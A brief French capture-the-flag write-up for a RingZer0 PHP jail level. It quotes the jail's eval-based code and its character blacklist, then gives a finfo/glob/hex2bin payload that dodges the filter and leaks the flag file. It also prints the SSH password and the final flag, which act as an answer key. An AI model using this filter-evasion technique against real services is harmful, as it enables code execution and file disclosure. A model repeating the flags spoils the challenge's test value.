ssh level3@challenges.ringzer0ctf.com -p 10225

Mot de passe: FLAG-X9uF51b0X570f616897kLN3It3K6m63c

WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"
```php
<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
	if(preg_match('/(\_|\'|\"|`|\.|\$|\/|a|c|s|z|require|include)/i', $var)) {
		return false;
	}
	return true;
}
if(filter($var)) {
	eval($var);
	echo "Command executed";
} else {
	echo "Restricted characters has been used";
}
echo "\n";
?>
```

On ne peut plus utiliser le _ comme dans highlight_file. En cherchant en ligne on peut tomber sur cette méthode finfo, elle affiche des informations sur un fichier. Elle est déjà connu pour être dangereuse car elle expose parfois trop d'information. On doit utiliser new Finfo car finfo_open() contient un _

FILEINFO_NONE = 0 donc comme ça a aussi un _ on doit mettre 0 à la place et c'est pour indiquer d'utiliser les paramètres par défaut.

new finfo(0, glob(hex2bin(hex2bin(3261)))[0]);

FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ